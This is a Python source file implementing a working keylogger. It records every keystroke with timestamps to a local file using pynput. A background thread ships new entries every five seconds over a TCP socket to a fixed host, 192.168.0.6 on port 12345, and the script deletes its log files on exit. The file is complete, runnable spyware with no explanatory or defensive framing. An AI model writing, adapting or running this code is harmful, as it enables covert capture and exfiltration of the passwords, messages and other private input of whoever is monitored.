import threading
import time
import socket
import os
from datetime import datetime
from pynput.keyboard import Key, Listener

keylog_file = "keylog.txt"
last_position_file = "last_position.txt"
current_line = f"{datetime.now()} - "

def on_press(key):
    global current_line
    if key == Key.space or key == Key.enter:
        with open(keylog_file, "a") as f:
            f.write(current_line + "\n")
        current_line = f"{datetime.now()} - "
    else:
        try:
            current_line += key.char
        except AttributeError:
            current_line += f" [{key}] "

def on_release(key):
    if key == Key.esc:
        return False

def run_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def send_keylog():
    while True:
        time.sleep(5)
        if os.path.exists(keylog_file):
            # read from last position
            if os.path.exists(last_position_file):
                with open(last_position_file, "r") as f:
                    last_position = int(f.read().strip())
            else:
                last_position = 0

            with open(keylog_file, "r") as f:
                f.seek(last_position)
                keylog_data = f.read()
                last_position = f.tell()

            if keylog_data:
                server_address = ("192.168.0.6", 12345)
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.connect(server_address)
                    sock.sendall(keylog_data.encode())
                    response = sock.recv(1024).decode()
                    print(f"Server response: {response}")

            # Save the new last position
            with open(last_position_file, "w") as f:
                f.write(str(last_position))

def main():
    t1 = threading.Thread(target=run_keylogger, daemon=True)
    t2 = threading.Thread(target=send_keylog, daemon=True)
    t1.start()
    t2.start()
    t1.join()  # Wait for the keylogger thread to finish

if __name__ == "__main__":
    main()
    os.remove("keylog.txt")
    os.remove("last_position.txt")